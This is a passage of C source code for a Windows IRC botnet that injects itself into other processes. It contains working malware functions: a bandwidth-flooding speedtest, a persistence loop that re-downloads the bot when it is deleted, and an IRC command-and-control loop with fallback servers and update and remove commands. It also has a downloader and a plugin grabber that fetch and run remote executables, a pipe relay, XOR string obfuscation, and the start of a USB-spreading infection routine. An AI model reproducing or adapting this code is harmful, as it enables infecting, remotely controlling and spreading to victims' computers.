			pInj->API.lstrcat(buff, pInj->Vars.Speedtest.szFrom);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_SpeedtestError);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Speedtest.szTestAgainst);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
		return 0;
	}

	// We should be connected

	pInj->Vars.Speedtest.sock = ret;
	bsrand(&pInj->Vars.Others.holdrand, pInj->API.GetTickCount());
	
	for (int i = 0; i < 1024; i++) {
		data[i] = (brand(&pInj->Vars.Others.holdrand) % 26) + 97;
	}

	end_time = (pInj->API.GetTickCount() / 1000) + pInj->Vars.Speedtest.iSeconds;

	while (1)
	{
		if ((pInj->API.GetTickCount() / 1000) > end_time) { break; };
		if ((tmp = pInj->API.send(pInj->Vars.Speedtest.sock, data, pInj->API.lstrlen(data), 0)) > 0) {
			speed += tmp;
		}
	}
	// Hopefully we have result...

	int kilobytes = 0;
	int kbs = 0;
	
	kilobytes = speed / 1024;
	kbs = kilobytes / 10;

	// Lets convert kbs to a char...
	if (kbs < pInj->Vars.Speedtest.iMin)
	{
		return 0;
	}

	// Convert to char
	int x = 0, j;
	char s[32];
	char u[32];
	

	do{
		s[x++]=(char)( kbs%10+48 );
		kbs-=kbs%10;
	}
	while((kbs/=10)>0);
	for (j=0;j<x;j++)
		u[x-1-j]=s[j];
	
	u[j]='\0';

	// Send speed
	pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Speedtest.szFrom);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
	pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_SpeedtestResult);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, u);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szKBS);
	buff[pInj->API.lstrlen(buff)] = 13;
	buff[pInj->API.lstrlen(buff)+1] = 10;
	pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
	//pInj->API.OutputDebugString(buff);

	return 1;
}
static void __declspec() ProcEnd_Speedtest() {} 

DWORD _stdcall Remote_FileProtection(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;
	char buff[1024];
	BOOL bFound = FALSE;
	HANDLE hFile;
	DWORD dwSize;

	if (pInj->Vars.FileProtection.bStatus == TRUE) {
		if (pInj->Vars.FileProtection.szDownloadURL == NULL) {
			// No download path
			bmemset(buff, 0, sizeof(buff));
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_FileProtNoURL);
			//Send_PRIVMSG(pInj, pInj->Vars.FileProtection.szStartedFrom, buff);
			return -1;
		}
		if (pInj->Vars.FileProtection.szFilePath == NULL) {
			// No file to protect - probably an error on startup?
			bmemset(buff, 0, sizeof(buff));
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szStartedFrom);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_FileProtNoBot);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
			return -2;
		}
		// Ok seems good ...
		if (pInj->Vars.FileProtection.Silent == 0) {
			bmemset(buff, 0, sizeof(buff));
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szStartedFrom);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_FileProtStarted);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szFilePath);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
		
		// Lets start the check loop
		while (pInj->Vars.FileProtection.bStatus)
		{
			pInj->API.Sleep(40000);	// 60 sec sleep
			hFile = pInj->API.CreateFile(pInj->Vars.FileProtection.szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,	0, NULL);
			if (hFile != INVALID_HANDLE_VALUE) {
				dwSize = pInj->API.GetFileSize(hFile, NULL);
			} else {
				dwSize = 0;
			}
			pInj->API.CloseHandle(hFile);
			bFound = (pInj->API.GetFileAttributes(pInj->Vars.FileProtection.szFilePath) != INVALID_FILE_ATTRIBUTES);

			if ((!bFound) || (dwSize != pInj->Vars.FileProtection.dwFileSize)) {
				// Not found (deleted?)
				if (pInj->Vars.FileProtection.Silent == 0) {
					bmemset(buff, 0, sizeof(buff));
					pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szStartedFrom);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
					pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_FileProtCantFind);
					buff[pInj->API.lstrlen(buff)] = 13;
					buff[pInj->API.lstrlen(buff)+1] = 10;
					pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
				}
				if (GrabBot(pInj, pInj->Vars.FileProtection.szDownloadURL, pInj->Vars.FileProtection.szFilePath))
				{
					// We have restored the bot
					if (pInj->Vars.FileProtection.Silent == 0) {
						bmemset(buff, 0, sizeof(buff));
						pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
						pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
						pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szStartedFrom);
						pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
						pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
						pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_FileProtRepaired);
						buff[pInj->API.lstrlen(buff)] = 13;
						buff[pInj->API.lstrlen(buff)+1] = 10;
						pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
						// Lets get the new bot size
						hFile = pInj->API.CreateFile(pInj->Vars.FileProtection.szFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,	0, NULL);
						if (hFile != INVALID_HANDLE_VALUE) {
							pInj->Vars.FileProtection.dwFileSize = pInj->API.GetFileSize(hFile, NULL);
						} else {
							pInj->Vars.FileProtection.dwFileSize = 0;
						}
						pInj->API.CloseHandle(hFile);
					}
				} else {
					// Error downloading
					if (pInj->Vars.FileProtection.Silent == 0) {
						bmemset(buff, 0, sizeof(buff));
						pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
						pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
						pInj->API.lstrcat(buff, pInj->Vars.FileProtection.szStartedFrom);
						pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
						pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
						pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_FileProtRepairErr);
						buff[pInj->API.lstrlen(buff)] = 13;
						buff[pInj->API.lstrlen(buff)+1] = 10;
						pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
					}
				}
			}
		}
	}

	return 1;
}
static void __declspec() ProcEnd_FileProtection() {};

DWORD _stdcall Remote_IRCThread(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;
	int ret;
	int conret;
	long lport;
	char szDNS[MAX_PATH];

	pInj->Vars.Settings.lConnectAttempts = 0;

	// We wanna do some mutex checking here.
	pInj->Vars.Settings.hMutex = pInj->API.CreateMutex(NULL, FALSE, pInj->Vars.Settings.szMutex);
	if (pInj->API.WaitForSingleObject(pInj->Vars.Settings.hMutex, 30000) == WAIT_TIMEOUT) {
		pInj->API.OutputDebugString(pInj->Vars.Others.szOFF);
		pInj->API.ExitThread(0);
	}
	// Start Winsock
	if (pInj->API.WSAStartup(MAKEWORD(2, 2), &pInj->Vars.IRC.wsaData) != 0) 
	{
		// Error starting winsock
#ifdef _DEBUGLITE
		pInj->API.OutputDebugString(pInj->Vars.Messages.szMsg_WSAFailed);
#endif
		return 1;
	}
	while(1)
	{
		if (pInj->Vars.Settings.lConnectAttempts > 4) {	pInj->Vars.Settings.lConnectAttempts = 0; };

		if (pInj->Vars.Settings.lConnectAttempts == 0)
		{
			bmemset(szDNS, 0, sizeof(szDNS));
			Clear_Var(pInj, szDNS);
			pInj->API.lstrcpy(szDNS, pInj->Vars.Settings.szDNS1);
			lport = pInj->Vars.Settings.lPort1;
		} else if (pInj->Vars.Settings.lConnectAttempts == 1) {
			bmemset(szDNS, 0, sizeof(szDNS));
			Clear_Var(pInj, szDNS);
			pInj->API.lstrcpy(szDNS, pInj->Vars.Settings.szDNS2);
			lport = pInj->Vars.Settings.lPort2;
		} else if (pInj->Vars.Settings.lConnectAttempts == 2) {
			bmemset(szDNS, 0, sizeof(szDNS));
			Clear_Var(pInj, szDNS);
			pInj->API.lstrcpy(szDNS, pInj->Vars.Settings.szDNS3);
			lport = pInj->Vars.Settings.lPort3;
		} else if (pInj->Vars.Settings.lConnectAttempts == 3) {
			bmemset(szDNS, 0, sizeof(szDNS));
			Clear_Var(pInj, szDNS);
			pInj->API.lstrcpy(szDNS, pInj->Vars.Settings.szDNS4);
			lport = pInj->Vars.Settings.lPort4;
		} else if (pInj->Vars.Settings.lConnectAttempts == 4) {
			bmemset(szDNS, 0, sizeof(szDNS));
			Clear_Var(pInj, szDNS);
			pInj->API.lstrcpy(szDNS, pInj->Vars.Settings.szDNS5);
			lport = pInj->Vars.Settings.lPort5;
		}


		pInj->API.Sleep(15000);
		conret = IRC_Connect(injStr, szDNS, lport);

		if (conret > 0)
		{
			pInj->Vars.Settings.lConnectAttempts = 0;
			pInj->Vars.IRC.sckIRC = conret;
#ifdef _DEBUGLITE
 			pInj->API.OutputDebugString(szDNS);
#endif
			if (IRC_Login(injStr, pInj->Vars.IRC.sckIRC) > 0)
			{
#ifdef _DEBUGLITE
				pInj->API.OutputDebugString(pInj->Vars.Messages.szMsg_Connected);
#endif
				ret = IRC_Listen(injStr, pInj->Vars.IRC.sckIRC);
				if (ret == -4) {
					// Commanded to die.
					pInj->API.closesocket(pInj->Vars.IRC.sckIRC);
					break;
				}else if (ret == -6) {
					// Reconnect
					pInj->API.closesocket(pInj->Vars.IRC.sckIRC);
					pInj->API.Sleep(10000);
				} else if (ret == -8) {
					// Update
					pInj->API.closesocket(pInj->Vars.IRC.sckIRC);
					pInj->API.ReleaseMutex(pInj->Vars.Settings.hMutex);
					RunFile(pInj, pInj->Vars.Settings.szBotPath, 1);
					break;
				} else if (ret == -9) {
					// Fake Update
					pInj->API.closesocket(pInj->Vars.IRC.sckIRC);
					pInj->API.WaitForSingleObject(pInj->Vars.Downloader.hThread, 300000);
					pInj->API.Sleep(300000);	// Sleep 5 mins :)
				}else if (ret == -10) {
					// Remove
					pInj->API.closesocket(pInj->Vars.IRC.sckIRC);
					if (pInj->API.DeleteFile(pInj->Vars.Settings.szBotPath) > 0)
					{
						// Removed successfully
						break;
					}
				}
#ifndef _DEBUGLITE
				pInj->API.Sleep(30000);
#endif
				pInj->API.closesocket(pInj->Vars.IRC.sckIRC);
			}
		} else {
#ifdef _DEBUGLITE
 			pInj->API.OutputDebugString(szDNS);
 			pInj->API.OutputDebugString(pInj->Vars.Messages.szMsg_ConnectFailed);
#endif
			pInj->Vars.Settings.lConnectAttempts++;

#ifndef _DEBUGLITE
			pInj->API.Sleep(30000);
#endif
		}
	}
	pInj->API.ReleaseMutex(pInj->Vars.Settings.hMutex);
	pInj->API.TerminateThread(pInj->Vars.USB.hThread, 0);
	pInj->API.TerminateThread(pInj->Vars.FileProtection.hThread, 0);
	pInj->API.TerminateThread(pInj->Vars.Others.hIPC, 0);
	pInj->API.ExitThread(0);

	return 1;
}
static void __declspec() ProcEnd_IRCThread() {} 

DWORD _stdcall Remote_PluginGrabber(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;
	PROCESS_INFORMATION	pInfo;
	STARTUPINFO	sInfo;
	char buff[1024] = { 0 };
	HINTERNET hOpen, hURL;
	HANDLE hFile;
	DWORD dwRead, dwWrite;
	char szData[1024];
	char *szSaveTo;
	
	if (pInj->Vars.Downloader.Silent == FALSE) {
		pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
		pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_DownloadPlugin);
		buff[pInj->API.lstrlen(buff)] = 13;
		buff[pInj->API.lstrlen(buff)+1] = 10;
		pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
	}
	szSaveTo = RandomPluginPath(pInj, pInj->Vars.Folders.szAppData);
	pInj->API.lstrcpy(pInj->Vars.Downloader.szSavedPath, szSaveTo);
	if (szSaveTo == NULL) { return FALSE; };

	pInj->API.DeleteUrlCacheEntry(pInj->Vars.Downloader.szURL);

	hOpen = pInj->API.InternetOpen(pInj->Vars.Others.szUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hOpen == NULL)
	{
		if (pInj->Vars.Downloader.Silent == FALSE) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_PluginError);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
		return 0;
	}
	hURL = pInj->API.InternetOpenURL(hOpen, pInj->Vars.Downloader.szURL, NULL, 0, 0, 0);
	if (hURL == NULL)
	{
		pInj->API.InternetCloseHandle(hOpen);
		if (pInj->Vars.Downloader.Silent == FALSE) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_PluginError);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
		return 0;
	}
	hFile = pInj->API.CreateFile(szSaveTo, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (hFile < (HANDLE)1)
	{
		pInj->API.InternetCloseHandle(hURL); pInj->API.InternetCloseHandle(hOpen);
		if (pInj->Vars.Downloader.Silent == FALSE) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_PluginError);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
		return 0;
	}
	while (pInj->API.InternetReadFile(hURL, szData, sizeof(szData) - 1, &dwRead) && dwRead != 0)
	{
		pInj->API.WriteFile(hFile, szData, dwRead, &dwWrite, NULL);
	}
	pInj->API.InternetCloseHandle(hURL);
	pInj->API.InternetCloseHandle(hOpen);
	pInj->API.CloseHandle(hFile);

	// Should be downloaded..
	pInj->API.lstrcat(pInj->Vars.Downloader.szPluginParams, pInj->Vars.Others.szQuote);
	pInj->API.lstrcat(pInj->Vars.Downloader.szPluginParams, pInj->Vars.Downloader.szSavedPath);
	pInj->API.lstrcat(pInj->Vars.Downloader.szPluginParams, pInj->Vars.Others.szQuote);


	// Lets execute the fucker
	ZeroMemory(&pInfo, sizeof(pInfo));
	ZeroMemory(&sInfo, sizeof(sInfo));
	sInfo.cb = sizeof(STARTUPINFO);
	sInfo.dwFlags = STARTF_USESHOWWINDOW;
	sInfo.wShowWindow = SW_SHOW;

	if (pInj->API.CreateProcess(NULL, pInj->Vars.Downloader.szPluginParams, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo))
	{
		if (pInj->Vars.Downloader.Silent == FALSE) {
			// Executed bot with Plugin param
// 			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
// 			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
// 			pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
// 			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
// 			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
// 			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_InstallingPlugin);
// 			buff[pInj->API.lstrlen(buff)] = 13;
// 			buff[pInj->API.lstrlen(buff)+1] = 10;
// 			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
	}
	return 1;
}
static void __declspec() ProcEnd_PluginGrabber() {} 

DWORD _stdcall Remote_Downloader(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;
	char buff[1024];
	BOOL ret = FALSE;
	PROCESS_INFORMATION	pInfo;
	STARTUPINFO	sInfo;
	
	ZeroMemory(&pInfo, sizeof(pInfo));
	ZeroMemory(&sInfo, sizeof(sInfo));
	sInfo.cb = sizeof(STARTUPINFO);

	bmemset(buff, 0, sizeof(buff));

	if (GrabFile(pInj, pInj->Vars.Downloader.szURL))
	{
		if (!pInj->Vars.Downloader.Silent)
		{
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Downloader.szFrom);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_Downloaded);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Downloader.szURL);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}

		if (pInj->Vars.Downloader.iMode) {
			// Lets run it
			sInfo.dwFlags = STARTF_USESHOWWINDOW;
			sInfo.wShowWindow = SW_SHOW;

			if (pInj->API.CreateProcess(NULL, pInj->Vars.Downloader.szSavedPath, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo)) {
				// Successfully executed.
				if (!pInj->Vars.Downloader.Silent) {
					bmemset(buff, 0, sizeof(buff));
					pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Downloader.szFrom);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
					pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_Executed);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Downloader.szSavedPath);
					buff[pInj->API.lstrlen(buff)] = 13;
					buff[pInj->API.lstrlen(buff)+1] = 10;
					pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
				}
			} else {
				// Failed executing
				if (!pInj->Vars.Downloader.Silent) {
					bmemset(buff, 0, sizeof(buff));
					pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Downloader.szFrom);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
					pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_ExecuteFailed);
					pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
					pInj->API.lstrcat(buff, pInj->Vars.Downloader.szSavedPath);
					buff[pInj->API.lstrlen(buff)] = 13;
					buff[pInj->API.lstrlen(buff)+1] = 10;
					pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
				}
			}
		}
	} else {
		if (!pInj->Vars.Downloader.Silent) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Downloader.szFrom);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
			pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_DownloadFailed);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, pInj->Vars.Downloader.szURL);
			buff[pInj->API.lstrlen(buff)] = 13;
			buff[pInj->API.lstrlen(buff)+1] = 10;
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
	}

	return 1;
}
static void __declspec() ProcEnd_Downloader() {} 

DWORD _stdcall Remote_IPC(LPVOID injStr)
{
	Injdat *pInj =  (Injdat *)injStr;
	BOOL fConnected;
	LPTSTR lpszPipename = pInj->Vars.Settings.szIPCName;
	CHAR chRequest[1024], buff[2048];      
	DWORD cbBytesRead;
	BOOL fSuccess;
    HANDLE hPipe;
	
	for (;;)
	{
		hPipe = pInj->API.CreateNamedPipe(lpszPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 5000, NULL);
		if (hPipe == INVALID_HANDLE_VALUE)
			return 0;

		fConnected = pInj->API.ConnectNamedPipe(hPipe, NULL) ? TRUE : (pInj->API.GetLastError() == ERROR_PIPE_CONNECTED);

		if (fConnected)
		{
			fSuccess = pInj->API.ReadFile(hPipe, chRequest, 1024, &cbBytesRead, NULL);
			chRequest[cbBytesRead] = 0;
		
			if ((pInj->Vars.IRC.sckIRC > 0) && (cbBytesRead > 0))
			{
				// We have data to send...
//				pInj->API.OutputDebugString(chRequest);
				bmemset(buff, 0, sizeof(buff));
				pInj->API.lstrcpy(buff, pInj->Vars.Others.szPRIVMSG);
				pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
				pInj->API.lstrcat(buff, pInj->Vars.Settings.szChannel);
				pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
				pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
				pInj->API.lstrcat(buff, chRequest);
				buff[pInj->API.lstrlen(buff)] = 13;
				buff[pInj->API.lstrlen(buff)+1] = 10;
				pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
			}
		} else {
			pInj->API.CloseHandle(hPipe);
		}
	}

	pInj->API.FlushFileBuffers(hPipe);                  
	pInj->API.DisconnectNamedPipe(hPipe); 
	pInj->API.CloseHandle(hPipe);
	return 1;
}
static void __declspec() ProcEnd_IPC() {} 

_inline void xor(LPVOID injStr, char *string, char *decode_key)
{
	Injdat *pInj =  (Injdat *)injStr;
	unsigned int	i, j;
	
	for (i = 0; i < pInj->API.lstrlen(string); i++) {
		
		for (j = 0; j < pInj->API.lstrlen(decode_key); j++)
			string[i] ^= decode_key[j];
		
		string[i] =~ string[i];
		
	}
	
	return;
}

_inline void xorusb(LPVOID injStr, char *string, char *decode_key)
{
	Injdat *pInj =  (Injdat *)injStr;
	unsigned int	i, j;
	int len;

	for (i = 0; i < pInj->API.lstrlen(string); i++) {
		
		for (j = 0; j < pInj->API.lstrlen(decode_key); j++)
			string[i] ^= decode_key[j];
		
		string[i] =~ string[i];
		
	}
	len = pInj->API.lstrlen(string);
	string[0] = 59;
	string[len - 2] = 13;
	string[len - 1] = 10;
	string[len ] = 0;

	return;
}

_inline void rand_line(LPVOID injStr, char *szLineBuffer)
{
	Injdat *pInj =  (Injdat *)injStr;
	int len;

	bmemset(szLineBuffer, 0, sizeof(szLineBuffer));
	
	szLineBuffer[0] = 59;

	bsrand(&pInj->Vars.Others.holdrand, (pInj->API.GetTickCount()));
	bsrand(&pInj->Vars.Others.holdrand, (pInj->API.GetTickCount() / (brand(&pInj->Vars.Others.holdrand) % 30)));

	for (int j = len = ((brand(&pInj->Vars.Others.holdrand) % 512) + 32); j > 0; j--) {
		do {
			szLineBuffer[j] = brand(&pInj->Vars.Others.holdrand) % 256;
		} while (szLineBuffer[j] == 32 ||  szLineBuffer[j] == 13 || szLineBuffer[ j ] == 10 || szLineBuffer[ j ] == 0);
	} 

	szLineBuffer[0] = 59;
	szLineBuffer[len - 2] = 13;
	szLineBuffer[len - 1] = 10;
	szLineBuffer[len ] = 0;
	return;
}

_inline void RandomCase(LPVOID injStr, char *pszText)
{
	Injdat *pInj =  (Injdat *)injStr;
	
	bsrand(&pInj->Vars.Others.holdrand, (pInj->API.GetTickCount()));
	bsrand(&pInj->Vars.Others.holdrand, (pInj->API.GetTickCount() / (brand(&pInj->Vars.Others.holdrand) % 30)));
	
    for (int i = 0; i < pInj->API.lstrlen(pszText); i++) {
        if(pszText[i] >= 65 && pszText[i] <= 90 && (brand(&pInj->Vars.Others.holdrand) % 2)) {
            pszText[i] += 97 - 65;
        } else if(pszText[i] >= 'a' && pszText[i] <= 122 && (brand(&pInj->Vars.Others.holdrand) % 2)) {
            pszText[i] -= 97 - 65;
        }
    }
	
    return;
}
_inline BOOL Infect_USB(LPVOID injStr, char *szDrive)
{
	Injdat *pInj =  (Injdat *)injStr;
	char szTemp[512] = { 0 };
	int len = 0;
	int i;
	int times = 0;
	BOOL ret = FALSE;
	BOOL retinf = FALSE;
	HANDLE hFile;
	DWORD dwWrite;
	DWORD dwSize;
	HANDLE hBot;

	bmemset(pInj->Vars.USB.szBotPath, 0, sizeof(pInj->Vars.USB.szBotPath));
	bmemset(pInj->Vars.USB.szInfPath, 0, sizeof(pInj->Vars.USB.szInfPath));
	bmemset(pInj->Vars.USB.szFirstDir, 0, sizeof(pInj->Vars.USB.szFirstDir));
	bmemset(pInj->Vars.USB.szSubDir, 0, sizeof(pInj->Vars.USB.szSubDir));
	
	// Generate Paths
	pInj->API.lstrcpy(pInj->Vars.USB.szInfPath, szDrive);
	pInj->API.lstrcat(pInj->Vars.USB.szInfPath, pInj->Vars.Spacers.szBackslash);
	pInj->API.lstrcat(pInj->Vars.USB.szInfPath, pInj->Vars.Others.szUSBInfFile);
	pInj->API.lstrcpy(pInj->Vars.USB.szFirstDir, szDrive);
	pInj->API.lstrcat(pInj->Vars.USB.szFirstDir, pInj->Vars.Spacers.szBackslash);
	pInj->API.lstrcat(pInj->Vars.USB.szFirstDir, pInj->Vars.Others.szUSBFolder);
	pInj->API.lstrcpy(pInj->Vars.USB.szSubDir, szDrive);
	pInj->API.lstrcat(pInj->Vars.USB.szSubDir, pInj->Vars.Spacers.szBackslash);
	pInj->API.lstrcat(pInj->Vars.USB.szSubDir, pInj->Vars.Others.szUSBFolder);
	pInj->API.lstrcat(pInj->Vars.USB.szSubDir, pInj->Vars.Spacers.szBackslash);
	pInj->API.lstrcat(pInj->Vars.USB.szSubDir, pInj->Vars.Others.szUSBSubdir);
	pInj->API.lstrcpy(pInj->Vars.USB.szBotPath, szDrive);
	pInj->API.lstrcat(pInj->Vars.USB.szBotPath, pInj->Vars.Folders.szUSBFolder);


	// Lets create the directories ...
